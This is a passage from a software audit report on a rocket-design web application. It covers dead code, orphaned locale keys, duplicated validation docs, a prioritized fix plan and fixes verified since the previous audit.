**LOW** | `docs/rasaero/validation/` vs `engine-java/validation/` | ✅ verified byte-identical but for one path-depth fixup in `score.mjs`. Nothing references the `docs/` copy specifically — `website/docs/contributing.md:166` points at the `engine-java/` one. | Two copies of the same anchors, fixtures and scorecards will drift, and a contributor re-scoring the engine cannot tell which is authoritative. | Delete `docs/rasaero/validation/`, leave a pointer in `docs/rasaero/README.md`.

---

## 🟢 Dead code

**LOW** | `state/store.ts:102,350` | `setTree` — ✅ verified dead by grep across `src/` and `e2e/`: declaration plus implementation, zero call sites. | It is also the only whole-tree setter that records no history entry, so anything that later reaches for it silently breaks undo. | Delete both.

**LOW** | `i18n/locales/en.json:243,276,285,761,762,823,827` (+ the es twins) | 7 orphaned keys — ✅ verified zero references across `src/` and `e2e/`: `tabs.motor`, `stability.title`, `stability.overstable`, `sims.run`, `sims.emptyHint`, `catalog.loadingComponents`, `catalog.failedComponents`. | `locales.test.ts` covers en↔es parity but has no orphan check, so these stay translated forever. The catalog pair is the telling one: ✅ `ComponentPicker.tsx:81` uses only `catalog.retry` — **the component picker lost its loading and error labels and nobody noticed**. | Delete the keys (or re-wire ComponentPicker), and add an orphan scan to `locales.test.ts` with an allowlist for the dynamic prefixes.

**LOW** | `services/motorStore.ts:47-50,101-120` | `readCatalog`/`writeCatalog` have no production caller — only their own test. `motorDb.ts:78-82` states outright that there is no localStorage mirror. _(reported)_ | They are required members of the `MotorStore` interface, so a custom store must implement two methods that are never called. | Drop from the interface and the implementation.

**LOW** | `web/knip.json:3` | The `"entry"` glob lists `src/**/*.test.ts` but not `.test.tsx`. **Not a blind spot** — the agent disproved its own lead: knip's vitest plugin reads `vitest.config.ts:24` and supplies both, proven by disabling the plugins and watching the three `.test.tsx` files turn into "unused". | Dead config that _looks_ load-bearing and invites someone to "fix" it. | Delete the hand-written glob (and `src/engine/vendor/**` from `ignore`, per knip's own hint).

**LOW** | `components/canvas/CenterView.tsx:114-124` | Two adjacent comments contradict each other: the first says the 3D view "stays upright" on a portrait phone, the second says all three design views rotate, and the code follows the second. | The first is now false and points a future reader at a hazard that was fixed with `resize={{ offsetSize: true }}`. | Delete the stale block.

**Verified clean — recorded so it is not re-litigated next time:** `npx knip` exits 0 (zero unused files, exports or dependencies), independently cross-checked by parsing every export in `src/` and resolving every relative import. 52 exports are imported only by tests — all intentional seams (`__resetIdbForTests`, `setMaterialStore`, `setDesignLibrary`, the whole `src/testing/` module). All 5 `eslint-disable` directives are live, proven by planting an inert one and watching `--max-warnings 0` fail the build. Exactly 2 default exports (`App.tsx`, `i18n/index.ts`), both as documented. en/es locale parity is exact at 778 keys each. The previously-reported `kernelLogSink` exports **no longer exist** — the module is now purely side-effecting.

---

## Recommended order of attack

**1 — Stop the bleeding (small, verified, user-facing).**
Drop `onClose` from the library dialog's deps 🟡 HIGH; confirm before Delete 🟡 HIGH; clamp `NumRow` (or swap in `NumberInput`) 🟡 HIGH. Half a day, and the first two are a shipped feature that is broken the moment it opens.

**2 — The data-loss trio.** 🟡 HIGH
Resolve IndexedDB transactions on `oncomplete`; that one fix also makes `migrate()`'s "only now is it safe" comment true. Then validate the journal _before_ writing it into the library. These are the findings where a user loses work they cannot get back.

**3 — Make the storage warnings reachable.** 🟡 HIGH
Give `storage.full` / `storage.degraded` their own slot so the rebuild's `setErr(null)` cannot wipe them. Cheap, and it is what surfaces #2 when it still goes wrong.

**4 — Stop the runaway work.** 🟡 HIGH
A generation token in `runSim`, and a record of a failed run so auto-run cannot retry forever.

**5 — Key on identity, not on names.** 🟡 HIGH
Derive a physics key for the two tree-identity effects, so a designer-name edit stops wiping every flight result. Then the engine-side `getName()` fix — emit the node id as a stable key, re-key the Java maps and the three Aero tables. **Rebuild the engine and run the parity harness** for that one.

**6 — Geometry that disagrees with the engine.** 🟡 HIGH
Hoist the freeform root-chord helper out of `tree/position.ts` and delete the four `Math.max` copies; wire `resolveAbsolutePositions` into the `.ork` load path. Both are drawn-vs-simulated mismatches.

**7 — Close the CI gates.** 🟠 HIGH/MED
An `engine-java` parity job; an e2e job; typecheck `e2e/` and `scripts/`; then the formatting one-shot (`.gitattributes` → `.prettierignore` → `npm run format` → `format:check` in CI) and `knip` in CI. After this a green check means something it does not mean today.

**8 — A11y.** 🟡 MED
Escape + focus trap on ExportDialog; `aria-current` on the new TabBar; names for the UnitChips and the wind-layer inputs; qualify the duplicate `.ork` menu items.

**9 — Dead code + orphans.** 🟢
`setTree`, the 7 locale keys (and decide whether ComponentPicker should get its loading labels back rather than lose them), `readCatalog`/`writeCatalog`, the knip glob, the stale CenterView comment, the duplicated `docs/rasaero/validation/`.

**10 — Defer, each behind a test on the extracted function.** 🟠
Memoize `buildSchematicShapes`; loop instead of spreading in `FlightChart`; consolidate the filename sanitizers and the download facades; extract `useWorkspaceEffects`' bodies so the five findings that live in that untested file become testable; backfill `openRocketEngine.test.ts`.

---

## Closed since the last audit (2026-09-09)

Verified fixed, not carried forward: the `.ork` zip-bomb cap (`orkImport.ts:14-20,30-48`) and the `MAX_NESTING_DEPTH` recursion cap are present; XML escaping covers every string emission in `orkExport`/`rasaeroExport`; the static-info pipeline is extracted to `services/buildRocket.ts:53` (`computeStaticInfo`) with an injectable build; the rebuild effect has its hydration gate; `saveOrk`/`saveRasaero` share `buildExportMotorMap`; the `nodeProps`/`scaleRocket` finiteness divergence is gone (`scaleRocket` imports `numOpt`); the `role="img"`-on-interactive-SVG hazard is scoped to the read-only vertical view; `Rocket3D` keeps `resize={{ offsetSize: true }}`. On tooling: knip installed, `--max-warnings 0` enforced, `noUncheckedIndexedAccess` enabled, and `ci.yml` added as a PR gate.
